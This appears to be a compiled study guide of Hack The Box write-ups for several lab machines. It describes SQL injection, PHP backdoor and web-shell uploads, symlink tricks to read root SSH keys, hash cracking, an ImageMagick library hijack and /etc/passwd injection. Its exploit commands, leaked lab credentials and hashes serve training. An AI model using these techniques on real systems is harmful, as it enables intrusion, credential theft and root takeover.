- see that the file was accepted, so let's try to request the symlink file with cURL . curl http://linkvortex.htb/content/images/test-file.png root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin node:x:1000:1000::/home/node:/bin/bash We are successful!
- A quick Google search leads us to this possible file /var/lib/ghost/config.production.json .
- The contents of the file have been snipped for readability. file> /var/lib/ghost/config.production.json <...SNIP...> "host": "linkvortex.htb", "port": 587, "auth": { "user": "bob@linkvortex.htb", "pass": "fibber-talented-worth" } <...SNIP...> Upon requesting it we find another set of credentials: bob@linkvortex.htb and the password fibber-talented-worth !

#### Commands and PDF search strings

- `nmap -sC -sV 10.10.11.47`
- `Nmap done: 1 IP address (1 host up) scanned in 12.61 seconds`
- `Nmap done: 1 IP address (1 host up) scanned in 13.41 seconds`
- `ffuf -w /usr/share/amass/wordlists/bitquark_subdomains_top100K.txt -H "Host:`
- `ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt`
- `curl http://linkvortex.htb/content/images/test-file.png`
- `ssh bob@linkvortex.htb`

### Artifacts and exact search anchors

`linkvortex.htb`, `/etc/hosts`, `/usr/share/amass/wordlists/bitquark_subdomains_top100K.txt`, `FUZZ.linkvortex.htb`, `dev.linkvortex.htb`, `/usr/share/seclists/Discovery/Web-Content/common.txt`, `git_dumper.py`, `CVE-2023-40028`, `/etc/passwd`, `exploit.zip`, `/usr/sbin`, `/usr/sbin/nologin`, `/usr/games`, `/var/cache/man`, `/var/spool/lpd`, `/var/mail`, `/var/spool/news`, `/var/spool/uucp`, `/var/www`, `/var/backups`, `/var/list`, `/var/lib/gnats`, `/home/node`, `CVE-2023-40028.sh`, `/var/lib/ghost/config.production.json`, `config.production.json`

Open the PDF around page **7** and search for the technologies, functions, filenames, and tools above.

### Privilege-escalation checks

- Race clean_symlink.sh until its privileged read copies/discloses root's private SSH key.
- Save the recovered key with correct formatting/permissions and authenticate as root.
- A local broken symlink is sufficient; re-uploading through Ghost is not required once bob has shell access.
- Export CHECK_CONTENT=true before invoking sudo clean_symlink.sh; sudo preserves it via env_keep+=CHECK_CONTENT, and without it the race can move the symlink but the script will not print the target file content.
- Run `sudo -l` and inspect the permitted command's exact version, arguments, environment, working directory, and files it reads. Search GTFOBins, but also review application-specific behavior.
- Search web roots, shares, home directories, and application folders for backups/archives. Inspect both contents and metadata; crack protected archives when needed.
- Inspect shell histories and command histories for credentials, internal hostnames, administrative scripts, and commands that reveal how services are managed.

### Root / Administrator path

**Memory chain:** sudo clean_symlink.sh → CHECK_CONTENT environment → symlink TOCTOU → root SSH key → SSH as root

- After the symlink is moved to quarantine, we can quickly swap the link target to point to a sensitive file such as /etc/shadow or even a private key for root such as /root/.ssh/id_rsa .
- The link will point to /root/.ssh/id_rsa to get a root ssh terminal.
- will take the key's contents and put them into a file on our local machine called root .
- Check your Internet connection or proxy settings Last login: Mon Dec 2 11:20:43 2024 from 10.10.14.61 root@linkvortex:~# ls root.txt We have successfully rooted the box and can read the contents of the root flag!
- Alternative Root Exploitation Before, we followed the box's and the intended use of the clean_symlink.sh script by uploading the symlink file through the initial exploit in ghost .

#### Commands and PDF search strings

- `ssh -i root root@linkvortex.htb`

### Artifacts and exact search anchors

`/usr/local/sbin`, `/usr/local/bin`, `/usr/sbin`, `/usr/bin`, `/usr/bin/bash`, `/opt/ghost/clean_symlink.sh`, `clean_symlink.sh`, `/var/quarantined`, `/usr/bin/echo`, `/usr/bin/sudo`, `/usr/bin/test`, `/usr/bin/basename`, `/usr/bin/readlink`, `/usr/bin/grep`, `/usr/bin/unlink`, `/usr/bin/mv`, `/usr/bin/cat`, `/etc/shadow`, `/root/.ssh/id_rsa`, `/opt/ghost`, `exploit2.zip`, `/opt/ghost/content/images$`, `/var/quarantined/key.png`, `/opt/ghost/content/images/key.png`, `linkvortex.htb`, `/var/quarantined/test.png`

Open the PDF around page **10** and search for `Privilege Escalation` plus the specific tools and artifacts above.


## 14- Dog

**Target:** Linux · Easy

[Detailed notes](./htb-writeups/Dog.md) · [Official PDF](./htb-writeups/Dog.pdf)

### Machine path overview

Dog is an easy-rated Linux machine that involves reading sensitive information through an exposed git repository and exposing credentials to get administrator access to BackdropCMS . The admin privileges allow an attacker to exploit Remote Code Execution by uploading a malicious archive containing a PHP backdoor to gain an initial foothold. The johncusack user account also reuses the BackdropCMS password. After compromising the johncusack account, the attacker finds that the user can run the bee executable with sudo privileges, which allows the attacker to gain root privileges.

### Remote enumeration and foothold checks

- Detect and recursively dump the exposed Backdrop CMS .git directory rather than relying only on web content discovery.
- Inspect recovered settings.php/history for the MySQL credential, then enumerate valid CMS usernames and test password reuse on the CMS login.
- Use administrator access to upload a Backdrop module/archive containing a PHP backdoor and trigger it for the web shell.
- Test the same recovered CMS/database password against local users; johncusack reuses it for SSH.
- The authenticated Backdrop module installer is not reachable at the clean path on this target; use ?q=/admin/modules/install and upload a correctly structured tar.gz containing a module directory, shell.info, and shell.php, then request /modules/shell/shell.php.
- Treat the web stack as Apache plus Backdrop CMS. Do not spend time on IIS `applicationHost.config`/binding enumeration for this machine.
- Read the target's own hosts file after foothold; internal aliases and backend names may not exist in external DNS. Add relevant names locally or preserve them in tunneled Host headers.
- Enumerate exposed/local Git metadata: remotes, branches, commit history, diffs, and deleted files. Search history—not just the current tree—for credentials and source changes.
- Search web roots, shares, home directories, and application folders for backups/archives. Inspect both contents and metadata; crack protected archives when needed.
- Enumerate every web root after foothold, not only the public site's directory. Correlate source files with Nginx/Apache/IIS bindings to discover hidden applications, credentials, upload paths, and code-execution sinks.

### Post-foothold local enumeration and lateral movement

- Stabilize with SSH as johncusack and run sudo -l.
- Inspect the allowed bee executable's help/subcommands and remember it is a Backdrop CLI that can evaluate PHP in the site context.
- Use the bee PHP-eval functionality to perform a privileged filesystem/command action rather than searching for a separate kernel exploit.

### User path

**Memory chain:** SSH → configuration-file secrets → Git history/config → database enumeration → directory/file discovery → password cracking → known-vulnerability research → web shell/RCE → reverse shell

- If using primary/replica databases or multiple connections, see the * advanced database documentation at * https://api.backdropcms.org/database-configuration */ $database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop'; $database_prefix = ''; The settings.php file contains credentials for MySQL; however, MySQL is not exposed.
- The MySQL password works for the tiffany user account and gives us Administrator access.
- can manually create a gz archive with a PHP reverse shell and upload it to get code execution. $ python3 exploit.py http://dog.htb Backdrop CMS 1.27.1 - Remote Command Execution Exploit Evil module generating...
- Evil module generated! shell.zip Go to http://dog.htb/admin/modules/install and upload the shell.zip for Manual Installation.
- Your shell address: http://dog.htb/modules/shell/shell.php $ ls shell shell.info shell.php $ tar -czvf shell.tar.gz shell shell/ shell/shell.php shell/shell.info The backend sends a success message that the file module has been uploaded successfully.

#### Commands and PDF search strings

- `nmap -Pn -p$ports -sC -sV 10.10.11.58`
- `ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -u`
- `curl http://dog.htb/core/profiles/testing/testing.info`

### Artifacts and exact search anchors

`dog.htb`, `/etc/hosts`, `web.config`, `settings.php`, `/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt`, `/usr/share/seclists/Usernames/xato-net-10-million-`, `exploit.py`, `shell.zip`, `shell.php`, `shell.tar.gz`, `/var/www/html/modules/shell$`, `/etc/passwd`, `/home/johncusack`, `/var/log/laurel`, `/home/johncusack/user.txt`

Open the PDF around page **4** and search for the technologies, functions, filenames, and tools above.

### Privilege-escalation checks

- Run bee through sudo and execute PHP that copies /bin/bash and sets its SUID bit (or directly spawns a privileged shell).
- Execute the prepared SUID bash with -p to preserve effective root privileges.
- Run `sudo -l` and inspect the permitted command's exact version, arguments, environment, working directory, and files it reads. Search GTFOBins, but also review application-specific behavior.
- Enumerate every web root after foothold, not only the public site's directory. Correlate source files with Nginx/Apache/IIS bindings to discover hidden applications, credentials, upload paths, and code-execution sinks.
- Enumerate nonstandard SUID files and compare them with GTFOBins. If custom, inspect strings/imports/config paths and environment handling rather than only executing it directly.

### Root / Administrator path

**Memory chain:** sudo rule abuse → password cracking → SUID abuse

- can pass a root directory from the wiki for Backdrop installation and perform the eval functionality to execute arbitrary PHP code.
- can use PHP's built-in function called system() to execute system commands as root. johncusack@dog:~$ sudo /usr/local/bin/bee --root=/var/www/html eval "echo shell_exec('whoami && id');" root uid=0(root) gid=0(root) groups=0(root) Now that we have command execution as root, we can pretty much do anything.

#### Commands and PDF search strings

- No single canonical command; follow the decision reminders and PDF section.

### Artifacts and exact search anchors

`/usr/local/sbin`, `/usr/local/bin`, `/usr/sbin`, `/usr/bin`, `/usr/local/bin/bee`, `/var/www/html`, `/tmp/bash`, `/root/root.txt`

Open the PDF around page **8** and search for `Privilege Escalation` plus the specific tools and artifacts above.


## 15- Usage

**Target:** Linux · Easy

[Detailed notes](./htb-writeups/Usage.md) · [Official PDF](./htb-writeups/Usage.pdf)

### Machine path overview

Usage is an easy Linux machine that features a blog site vulnerable to SQL injection, which allows the administrator's hashed password to be dumped and cracked. This leads to access to the admin panel, where an outdated Laravel module is abused to upload a PHP web shell and obtain remote code execution. On the machine, plaintext credentials stored in a file allow SSH access as another user, who can run a custom binary as root . The tool makes an insecure call to 7zip , which is leveraged to read the root user's private SSH key and fully compromise the system.

### Remote enumeration and foothold checks

- Test the blog/admin authentication workflow for SQL injection, dump the administrator hash, and crack it offline.
- After admin login, fingerprint the Laravel admin/file-manager component and exploit its outdated upload behavior to place a PHP web shell.
- From the web shell, search application/user files for plaintext credentials and test reuse against local users/SSH.
- Test the email parameter in POST /forget-password, save the complete CSRF/session request as reset.req, and use sqlmap -r reset.req -p email --batch --level 3; the default level produces 500/503 responses and misses the boolean/time-based injection used to dump usage_blog.admin_users.
- CVE-2023-24249 is in Laravel Admin's avatar settings: upload PHP renamed to shell.jpg, intercept the request and change filename= to shell.jpg.php, then request /uploads/images/shell.jpg.php?melo=<command>; a direct .php upload is rejected.
- Read the target's own hosts file after foothold; internal aliases and backend names may not exist in external DNS. Add relevant names locally or preserve them in tunneled Host headers.
- Manually validate SQL injection and determine the backend/column count. If automation fails, use DB-specific functions and nested queries rather than abandoning the lead.
- Test upload validation separately for extension, MIME, magic bytes, filename/path, and post-upload execution. Determine the exact storage path and whether timing/name prediction is involved.
- Enumerate every web root after foothold, not only the public site's directory. Correlate source files with Nginx/Apache/IIS bindings to discover hidden applications, credentials, upload paths, and code-execution sinks.
- After foothold, enumerate local listeners with `ss -lntup`/`netstat` and map each PID/process. Tunnel or access services bound only to `127.0.0.1`/IPv6 loopback; external Nmap cannot see them.
- Enumerate nonstandard SUID files and compare them with GTFOBins. If custom, inspect strings/imports/config paths and environment handling rather than only executing it directly.
- Inspect shell histories and command histories for credentials, internal hostnames, administrative scripts, and commands that reveal how services are managed.

### Post-foothold local enumeration and lateral movement

- Move laterally to xander with the plaintext password, then run sudo -l and enumerate every menu option in usage_management.
- Observe the Project Backup command via process monitoring: /usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- * runs as root from a user-writable web directory.
- Understand 7-Zip listfile syntax: a filename beginning with @ is interpreted as a file containing paths to archive.
- Create @id_rsa plus an id_rsa symlink to /root/.ssh/id_rsa in the backup source directory.
- After landing as dash, run ss -tlpn and investigate loopback 127.0.0.1:2812; /proc is mounted hidepid=2, but Monit runs as dash, so ~/.monitrc is readable and its allow admin:<password> value is reused to SSH as xander.

### User path

**Memory chain:** forgot-password SQL injection → Laravel Admin avatar filename bypass → PHP web shell → Monit credential reuse → SSH as xander

- Upgrading our web shell to an interactive reverse shell is trivial; we start by generating a payload on revshells.
- see that the port belongs to a process monit , with a process ID (PID) of 33663 .
- In the .service file we see that monit is running as dash , which explains why we know its PID despite process snooping being disabled on the machine.
- In our user's home directory, we find the monit control file, namely .monitrc : dash@usage:~$ ls -al ~ total 52 drwxr-x--- 6 dash dash 4096 Aug 7 15:50 . drwxr-xr-x 4 root root 4096 Aug 16 lrwxrwxrwx 1 root root 9 Apr 2023 ..
- close the reverse shell and authenticate via SSH for a more stable shell. ssh xander@usage.htb The authenticity of host 'usage.htb (10.10.11.18)' can't be established.

#### Commands and PDF search strings

- `nmap -p$ports -sC -sV 10.10.11.18`
- `Nmap done: 1 IP address (1 host up) scanned in 6.90 seconds`
- `sqlmap -r reset.req -p email --batch`
- `sqlmap -r reset.req -p email --batch --level 3`
- `sqlmap identified the following injection point(s) with a total of 448 HTTP(s) requests:`
- `sqlmap -r reset.req -p email --batch --level 3 --dbs`
- `sqlmap -r reset.req -p email --batch --level 3 -D usage_blog --tables --threads=10`
- `sqlmap -r reset.req -p email --batch --level 3 -D usage_blog -T admin_users --dump`
- `john hash --wordlist=/usr/share/wordlists/rockyou.txt`
- `Mount Options:`
- `ssh xander@usage.htb`

### Artifacts and exact search anchors

`usage.htb`, `/etc/hosts`, `admin.usage.htb`, `/usr/share/wordlists/rockyou.txt`, `CVE-2023-24249`, `jpg.php`, `shell.php`, `shell.jpg.php`, `/var/www/html/project_admin/public/uploads/images$`, `/home/dash/user.txt`, `/usr/bin/moni`, `/etc/fstab`, `/usr/share/doc/monit/examples/monit.service`, `/etc/systemd/system/monit.service`, `/etc/systemd/system/multi-user.target.wants/monit.service`, `/usr/bin/monit`, `/var/run/apache2/apache2.pid`

Open the PDF around page **10** and search for the technologies, functions, filenames, and tools above.

### Privilege-escalation checks

- Trigger the root Project Backup option so 7-Zip follows the symlink while parsing the @id_rsa listfile and discloses the root private key.
- Extract/copy the key from output/archive, preserve formatting, chmod 600, and SSH as root.
- The subtle bug is @listfile parsing combined with a symlink, not merely the -snl option by itself.
- The 7-Zip escalation is deterministic `@listfile` parsing combined with an `id_rsa` symlink to `/root/.ssh/id_rsa`; it is not a race condition, even though the backup command includes `-snl`.
- Run `sudo -l` and inspect the permitted command's exact version, arguments, environment, working directory, and files it reads. Search GTFOBins, but also review application-specific behavior.
- Search web roots, shares, home directories, and application folders for backups/archives. Inspect both contents and metadata; crack protected archives when needed.
- Enumerate every web root after foothold, not only the public site's directory. Correlate source files with Nginx/Apache/IIS bindings to discover hidden applications, credentials, upload paths, and code-execution sinks.

### Root / Administrator path

**Memory chain:** sudo usage_management backup → 7-Zip @listfile parsing → id_rsa symlink → root private-key disclosure → SSH as root

- Reset admin password Enter your choice (1/2/3): We get an option to either back up the project, the MySQL database, or reset the admin's password.
- When 7zip attempts to read the list of files from id_rsa , it instead reads the content of /root/.ssh/id_rsa . xander@usage:/var/www/html$ ln -s /root/.ssh/id_rsa id_rsa 3.
- Run the tool with sudo and select the Project Backup option: This step triggers the 7zip command, which follows the symlink and includes the contents of the root's SSH key in the archive. xander@usage:/var/www/html$ sudo /usr/bin/usage_management Choose an option: 1.
- Since id_rsa is a symlink to the root's SSH key, 7zip reads the contents of the SSH key file, causing the contents to be included in the output.
- However, when 7zip reads the id_rsa symlink as a list of files, it still follows the symlink to read the target file's content, which allows the exploit to work.

#### Commands and PDF search strings

- `ssh -i id_rsa root@usage.htb`

### Artifacts and exact search anchors

`/usr/local/sbin`, `/usr/local/bin`, `/usr/sbin`, `/usr/bin`, `/usr/bin/usage_management`, `/var/backups`, `/var/backups/project.zip`, `project.zip`, `/var/backups/`, `/var/www/html`, `/usr/bin/7za`, `/usr/bin/mysqldump`, `/var/backups/mysql_backup.sql`, `/var/www/html/`, `/var/www/html$`, `/root/.ssh/id_rsa`, `usage.htb`, `/root/root.txt`

Open the PDF around page **21** and search for `Privilege Escalation` plus the specific tools and artifacts above.


## 16- Titanic

**Target:** Linux · Easy

[Detailed notes](./htb-writeups/Titanic.md) · [Official PDF](./htb-writeups/Titanic.pdf)

### Machine path overview

Titanic is an easy difficulty Linux machine that features an Apache server listening on port 80. The website on port 80 advertises the amenities of the legendary Titanic ship and allows users to book trips. A second vHost is also identified after fuzzing, which points to a Gitea server. The Gitea server allows registrations, and exploration of the available repositories reveals some interesting information including the location of a mounted Gitea data folder, which is running via a Docker container. Back to the original website, the booking functionality is found to be vulnerable to an Arbitrary File Read exploit, and combining the directory identified from Gitea, it is possible to download the Gitea SQLite database locally. Said database contains hashed credentials for the developer user, which can be cracked. The credentials can then be used to login to the remote system over SSH. Enumeration of the file system reveals that a script in the /opt/scripts directory is being executed every minute. This script is running the magick binary in order to gather information about specific images. This version of magick is found to be vulnerable to an arbitrary code execution exploit assigned CVE-2024-41817. Successful exploitation of this vulnerability results in elevation of privileges to the root user.

### Remote enumeration and foothold checks

- Fuzz virtual hosts and discover the Gitea vhost; ordinary path fuzzing of the Titanic site does not reveal it.
- Register on Gitea and read both public repositories, especially docker-config, for volume mounts, internal ports, and database paths.
- Use the booking download/path parameter as an arbitrary file read, combining it with the Gitea Docker volume path learned from compose files.
- Retrieve the Gitea SQLite database, extract the developer password hash with its parameters/salt, convert it to the proper Hashcat format, and crack it.
- Use the recovered developer credential over SSH.
- Docker Compose is used only to reveal the mounted Gitea database path for the booking file-read primitive. Crack the recovered SQLite credential and SSH as developer; there is no LXD/LXC or container escape.
- Run virtual-host discovery with the correct Host header and filter the baseline response size; do not stop at directory brute forcing the default site.
- Read the target's own hosts file after foothold; internal aliases and backend names may not exist in external DNS. Add relevant names locally or preserve them in tunneled Host headers.
- Turn file read/LFI into targeted discovery: source code via wrappers, environment/config files, SSH keys, logs, and service credentials. Test traversal normalization and encoding.
- Enumerate every web root after foothold, not only the public site's directory. Correlate source files with Nginx/Apache/IIS bindings to discover hidden applications, credentials, upload paths, and code-execution sinks.
- Search web roots, shares, home directories, and application folders for backups/archives. Inspect both contents and metadata; crack protected archives when needed.
- After foothold, enumerate local listeners with `ss -lntup`/`netstat` and map each PID/process. Tunnel or access services bound only to `127.0.0.1`/IPv6 loopback; external Nmap cannot see them.

### Post-foothold local enumeration and lateral movement

- Inspect /opt rather than stopping at sudo -l: /opt/scripts/identify_images.sh runs in /opt/app/static/assets/images.
- Check directory ownership/permissions; developer can write the image directory consumed by the root script.
- Watch metadata.log timestamps and confirm identify_images.sh executes every minute.
- Note the script calls /usr/bin/magick identify on attacker-controlled JPG files and identify the installed ImageMagick version.

### User path

**Memory chain:** Gitea vhost and Docker volume mapping → booking arbitrary file read → Gitea SQLite hash cracking → SSH as developer

- If we manage to access it we might get access to encrypted user passwords.
- The database file is typically named gitea.db , however, attempting to access /home/developer/gitea/data/gitea.db does not seem to work.
- check its contents. sqlite> select * from user; 1|administrator|administrator||root@titanic.htb|0|enabled|cba20ccf927d3ad0567b68161732d3fb ca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136|pbkdf2$50000$50|0|0|0 ||0|||70a5bd0c1a5d23caa49030172cdcabdc|2d149e5fbd1b20cf31db3e3c6a28fc9b|enUS||1722595379|1722597477|1722597477|0|-1|1|1|0|0|0|1|0|2e1e70639ac6b0eecbdab4a3d19e0f44|r oot@titanic.htb|0|0|0|0|0|0|0|0|0||gitea-auto|0 2|developer|developer||developer@titanic.htb|0|enabled|e531d398946137baea70ed6a680a54385ec ff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56|pbkdf2$50000$50|0|0|0||0 |||0ce6f07fc9b557bc070fa7bef76a0d15|8bf3e3452b78544f8bee9400d6936d34|enUS||1722595646|1722603397|1722603397|0|-1|1|0|0|0|0|1|0|e2d95b7e207e432f62f3508be406c11b|d eveloper@titanic.htb|0|0|0|0|2|0|0|0|0||gitea-auto|0 3|trx|trx||trx@titanic.htb|0|enabled|417d2fafa7361ae7ce12147a3825a45b64748f075b71b3f108ae6 f5de2630c4bdff4100fb97a2a10718f76d6738fbc7cba57|pbkdf2$50000$50|0|0|0||0|||5554f89b8e2dc75 9d55363bff79c9bc2|d2df33392fe014a3fdd4598265eacb52|enUS||1750341587|1750341588|1750341588|0|-1|1|0|0|0|0|1|0|46a0a3c2b6ba179273294250929f5937|t rx@titanic.htb|0|0|0|0|0|0|0|0|0||gitea-auto|0 We can see that a few users exist including the one we created earlier.
- Started: Thu Jun 19 17:32:50 2025 Stopped: Thu Jun 19 17:32:57 2025 After the above command finishes we can use the --show flag to see the result. hashcat -m 10900 hash.txt --show sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvx aCYZJjRE6llM+1Y=:25282528 The password is successfully cracked as 25282528 .
- can attempt to connect over SSH as developer . ssh developer@titanic.htb developer@titanic.htb's password: Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-131-generic x86_64) developer@titanic:~$ id uid=1000(developer) gid=1000(developer) groups=1000(developer) The user flag can be found in /home/developer/ .

#### Commands and PDF search strings

- `nmap -A -v 10.129.180.219`
- `gobuster vhost -u http://titanic.htb -w /usr/share/seclist/Discovery/DNS/subdomainstop1million-20000.txt --append-domain -r`
- `curl 'http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/gitea.db' -o`
- `hashcat -m 10900 hash.txt /usr/share/wordlists/rockyou.txt`
- `hashcat (v6.2.6) starting`
- `hashcat -m 10900 hash.txt --show`
- `ssh developer@titanic.htb`

### Artifacts and exact search anchors

`titanic.htb`, `/etc/hosts`, `8185b6fa-8311-4e71-be06-e051fbaea8c0.json`, `40titanic.htb`, `/etc/passwd`, `/usr/sbin`, `/usr/sbin/nologin`, `/usr/games`, `/var/cache/man`, `/var/spool/lpd`, `/var/mail`, `/var/spool/news`, `/var/spool/uucp`, `/var/www`, `/var/backups`, `/var/list`, `/var/lib/gnats`, `/var/cache/pollinate`, `/home/syslog`, `/var/lib/tpm`, `/var/lib/landscape`, `/var/lib/usbmux`, `/home/developer`, `/var/snap/lxd/common/lxd`, `/var/lib/misc`, `/var/log/laurel`, `/usr/share/seclist/Discovery/DNS/subdomainstop1million-20000.txt`, `/usr/share/seclist/Discovery/DNS/subdomains-top1million-20000.txt`, `dev.titanic.htb`, `app.py`, `/home/developer/gitea/data`, `gitea.db`, `/home/developer/gitea/data/gitea.db`, `/tmp/data`, `docker-compose.yml`, `/usr/local/bin/gitea`

Open the PDF around page **8** and search for the technologies, functions, filenames, and tools above.

### Privilege-escalation checks

- Exploit CVE-2024-41817 by placing the crafted ImageMagick configuration/payload and trigger image in the writable images directory.
- Wait for the periodic root image-identification job to load the malicious content and execute the payload.
- The key chain is writable input directory plus recurring root magick execution; merely finding the CVE is insufficient.
- CVE-2024-41817 is triggered by compiling the constructor payload specifically as libxcb.so.1 inside /opt/app/static/assets/images; the recurring root magick identify job loads that library from its working directory, creates the SUID /tmp/sh, and the shell must be run with -p.
- Enumerate nonstandard SUID files and compare them with GTFOBins. If custom, inspect strings/imports/config paths and environment handling rather than only executing it directly.

### Root / Administrator path

**Memory chain:** writable image work directory → recurring root magick identify → CVE-2024-41817 libxcb.so.1 load → SUID /tmp/sh -p

- System enumeration reveals a MySQL installation as hinted by the Docker compose file we identified earlier, however, the database does not seem to hold any valuable information.
- A quick Google search with the keywords magick exploit poc reveals this advisory, which details an Arbitrary Code Execution vulnerability in the same version of magick and is assigned CVE-2024-41817.
- can execute it with the -p flag to increase our privileges to that of the root user. developer@titanic:/opt/app/static/assets/images$ /tmp/sh -p # id uid=1000(developer) gid=1000(developer) euid=0(root) groups=1000(developer) The root flag can be found in /root .

#### Commands and PDF search strings

- `find /opt/app -type d -perm 770`
- `find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify`

### Artifacts and exact search anchors

`/opt/app`, `identify_images.sh`, `/opt/app/static/assets/images`, `/opt/app/static/assets/images/`, `/usr/bin/magick`, `/opt/app/static/assets/images$`, `license.php`, `CVE-2024-41817`, `/tmp/sh`

Open the PDF around page **14** and search for `Privilege Escalation` plus the specific tools and artifacts above.


## 17- Outbound

**Target:** Linux · Easy

[Detailed notes](./htb-writeups/Outbound.md) · [Official PDF](./htb-writeups/Outbound.pdf)

### Machine path overview

Outbound is an easy-difficulty Linux machine with provided assumed breach credentials. The credentials provide access to a Roundcube instance, where the user can enumerate the version and utilize CVE-202549113, which demonstrates post-authenticated remote code execution via PHP object deserialization. After initial access to the target, we enumerate the database and find a session for the Jacob user, which, when base64 decoded, provides an encrypted password. Using an internal tool called decrypt.sh , we can extract the plaintext value of the password, which allows access to Roundcube as Jacob. Jacob has two messages in his inbox: one provides him with a new, updated password for the system, and another informs him that they have been granted sudo privileges to monitor system resources with a utility called below which is vulnerable to CVE-2025-27591 that is a flaw that creates logs within the /var/log/below directory with excessive permissions allowing attackers to perform symlink attacks under certain conditions. We symlink /etc/passwd to the error_root.log file and write our payload to the log file via parameter injection, thereby creating a new user with a UID of the root user.

### Remote enumeration and foothold checks

- Use the provided assumed-breach credential on Roundcube and fingerprint the exact version after login.
- Exploit CVE-2025-49113 through the authenticated PHP object-deserialization path to gain the www-data shell.
- Read /var/www/html/roundcube/config/config.inc.php for the local Roundcube MySQL credential.
- Enumerate the Roundcube session table, base64/decode serialized session data, and identify Jacob's encrypted stored password.
- Use Roundcube's own decrypt.sh/config key rather than attempting to crack the ciphertext; then log in as Jacob and read both inbox messages for the updated system password and sudo clue.
- Fuzz the Host header and add mail.outbound.htb locally; Roundcube is hosted on that vhost while the base hostname presents only the default Nginx page.
- CVE-2025-49113 reaches unsafe unserialize through the attacker-controlled _from parameter in upload.php's authenticated image-upload handler; preserve the valid Roundcube session when sending the exploit.
- The foothold chain is the assumed-breach Roundcube login, authenticated CVE-2025-49113 deserialization, Roundcube session-password decryption, then Jacob's email/SSH credential. Git history and group-membership abuse are not transitions in this path.
- Read the target's own hosts file after foothold; internal aliases and backend names may not exist in external DNS. Add relevant names locally or preserve them in tunneled Host headers.
- Run virtual-host discovery with the correct Host header and filter the baseline response size; do not stop at directory brute forcing the default site.
- Identify the exact serialization format, signing/encryption boundary, and gadget environment before generating a payload; source review often reveals the required class/library.
- Enumerate every web root after foothold, not only the public site's directory. Correlate source files with Nginx/Apache/IIS bindings to discover hidden applications, credentials, upload paths, and code-execution sinks.

### Post-foothold local enumeration and lateral movement

- Authenticate locally/SSH as Jacob with the password from email and run sudo -l.
- Identify the allowed below utility and CVE-2025-27591; inspect /var/log/below and verify its directory/log handling is world-writable/unsafe.
- Test below argument injection/newline behavior before targeting a privileged file.
- Create a symlink from the writable below error log to /etc/passwd and generate a valid crypt hash for a UID-0 account line.

### User path

**Memory chain:** assumed-breach Roundcube login → CVE-2025-49113 authenticated deserialization → Roundcube session-password decryption → Jacob email credential → SSH as jacob

- The output also reveals the domain outbound.htb , which we can add to our /etc/hosts file. $ echo "10.129.237.221 outbound.htb" |sudo tee -a /etc/hosts HTTP Upon visiting the landing page, we see the default landing page for Nginx.
- Searching online for Roundcube 1.6.10 reveals this link which is a disclosure addressing a how this Roundcube version is susceptible to remote code execution through PHP object deserialization through a unsafe unserialize() function on user-controlled data via the _from parameter in the image upload handler in upload.php .
- search on google how to decrypt Roundcube passwords and find their own utility called decrypt.sh .
- found a set of credentials for jacob, let's read the other email.

#### Commands and PDF search strings

- `nmap -p$ports -sC -sV 10.129.237.221`
- `ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host:`
- `wget https://raw.githubusercontent.com/fearsoff-org/CVE-2025-49113/refs/heads/main/CVE2025-49113.php`
- `ssh jacob@outbound.htb`

### Artifacts and exact search anchors

`outbound.htb`, `/etc/hosts`, `/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt`, `FUZZ.outbound.htb`, `/usr/share/seclists/Discovery/DNS/subdomains-top1million-`, `mail.outbound.htb`, `/etc/passwd`, `upload.php`, `/tmp/pwned`, `CVE-2025-49113`, `CVE2025-49113.php`, `CVE-2025-49113.php`, `/var/www/html/roundcube/public_html$`, `/var/www/html/roundcube/config/config.inc.php`, `config.inc.php`, `/var/www/html/roundcube$`, `decrypt.sh`, `/var/www/html/roundcube`, `/var/www/html/roundcube/bin/decrypt.sh`, `/home/jacob/user.txt`

Open the PDF around page **3** and search for the technologies, functions, filenames, and tools above.

### Privilege-escalation checks

- Invoke sudo below with the crafted parameter/newline so the root process writes the UID-0 account entry through the /etc/passwd symlink.
- Switch to the injected account with the chosen password to obtain root.
- Re-check the sudo exclusions: allowed wildcard arguments and blocked config/debug forms affect payload construction.
- Run `sudo -l` and inspect the permitted command's exact version, arguments, environment, working directory, and files it reads. Search GTFOBins, but also review application-specific behavior.
- Obtain and read source code for route names, hidden parameters, database queries, local file paths, secrets, and unsafe command/template construction.

### Root / Administrator path

**Memory chain:** sudo below → CVE-2025-27591 log-file handling → /etc/passwd symlink and newline injection → UID-0 account

- Now we need to figure out how to abuse this.
